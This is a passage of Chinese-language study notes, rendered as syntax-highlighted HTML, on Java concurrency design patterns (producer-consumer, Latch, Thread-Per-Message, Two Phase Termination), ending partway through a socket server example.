                <span class="token class-name">Message</span> message <span class="token operator">=</span> messageQueue<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" take message "</span> <span class="token operator">+</span> message<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 测试类
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerAndConsumerClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">MessageQueue</span> messageQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MessageQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ProducerThread</span><span class="token punctuation">(</span>messageQueue<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ProducerThread</span><span class="token punctuation">(</span>messageQueue<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ProducerThread</span><span class="token punctuation">(</span>messageQueue<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ConsumerThread</span><span class="token punctuation">(</span>messageQueue<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">ConsumerThread</span><span class="token punctuation">(</span>messageQueue<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter14：Latch 设计模式（阀门设计模式）</h1>
<blockquote>
<p>Java高并发编程详解：第二十三章</p>
</blockquote>
<p>等待所有条件满足时，阀门才会被打开：利用CountDownLatch</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">CountDownLatch</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDKCountDown</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">CountDownLatch</span> latch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"准备多线程处理任务."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//The first phase.</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span>
                <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is working."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
                        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                    latch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 无限等待</span>
        latch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//The second phase.</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"多线程任务全部结束,准备第二阶段任务"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"............"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"FINISH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter15：Thread-Per-Message 设计模式</h1>
<blockquote>
<p>Java高并发编程详解：第二十四章</p>
</blockquote>
<p>为每一个消息的处理开辟一个线程，使得消息能够以并发的方式进行处理，从而提高系统整体的吞吐能力。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Message</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> value<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Message</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MessageHandler</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">ExecutorService</span> executor <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token class-name">Message</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        executor<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> value <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The message will be handle by "</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        executor<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PerThreadClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">MessageHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MessageHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>
                        i <span class="token operator">-&gt;</span> handler<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Message</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>

        handler<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter16：Two Phase Termination 设计模式</h1>
<blockquote>
<p>Java高并发编程详解：第二十五章</p>
</blockquote>
<p>当一个线程正常结束，我们需要考虑如何正常释放线程中资源：文件句柄、Socket套接字句柄、数据库连接等</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220120111130525-1667230559747-59.png" alt="image-20220120111130525"></p>
<p>在第二阶段释放资源的时候需要考虑如下几个问题：</p>
<ul>
<li>第二阶段的终止需要保证安全性，比如涉及对共享资源的操作</li>
<li>对资源的释放时间需要控制在一个可控的时间范围内</li>
<li>要百分百的确保线程的结束：第二阶段出现死循环、线程阻塞等异常无法结束</li>
</ul>
<ol>
<li>简单的two phrase termination 设计模式实现：利用finally执行</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CounterIncrement</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> terminated <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>terminated<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> counter<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 执行程序结束后的任务
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"do some clean work for the second phase,current counter "</span> <span class="token operator">+</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token comment">/**
     * 结束线程
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>terminated <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CounterTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">CounterIncrement</span> counterIncrement <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CounterIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        counterIncrement<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10_000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        counterIncrement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="2">
<li>
<p>Socket套接字</p>
<ul>
<li>
<p>服务端</p>
<p>线程池容量为2，等待其他连接关闭，才会处理第三个链接任务</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppServer</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>


    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> port<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_PORT</span> <span class="token operator">=</span> <span class="token number">12722</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> start <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ClientHandler</span><span class="token punctuation">&gt;</span></span> clientHandlers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ExecutorService</span> executor <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">ServerSocket</span> serverSocket<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">AppServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>port <span class="token operator">=</span> <span class="token constant">DEFAULT_PORT</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">AppServer</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>port <span class="token operator">=</span> port<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"端口："</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">"，正在等待客户端连接....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>start<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 获取客户端链接</span>
                <span class="token class-name">Socket</span> client <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 保留客户端链接，用于退出前的清理 </span>
                <span class="token class-name">ClientHandler</span> clientHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClientHandler</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
                clientHandlers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>clientHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 提交任务处理</span>
                executor<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>clientHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

